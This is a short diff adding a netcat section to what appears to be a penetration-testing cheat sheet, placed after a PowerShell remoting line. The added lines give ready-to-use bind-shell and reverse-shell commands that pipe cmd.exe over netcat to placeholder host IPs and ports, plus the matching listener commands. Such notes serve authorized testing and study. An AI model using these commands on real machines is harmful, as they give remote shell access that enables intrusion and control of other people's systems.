@@ -31,6 +31,19 @@ Enter-PSSession -ComputerName "hostname"-Credential "easyduck"
 
 ## Netcat
 
+rhost_ip: xxx.xxx.xxx.xxx
+lhost_ip: yyy.yyy.yyy.yyy
+rhost_open_port: 4444
+lhost_open_port: 5555
+
+### bindshell
+rhost : nc -nlvp 4444 -e cmd.exe
+lhost : nc -nv xxx.xxx.xxx.xxx 4444
+
+### reverseshell
+rhost : nc -nv yyy.yyy.yyy.yyy 5555 -e cmd.exe
+lhost : nc -nlvp 5555
+
 ## Server Settings
 
 - RPORT = `4444`
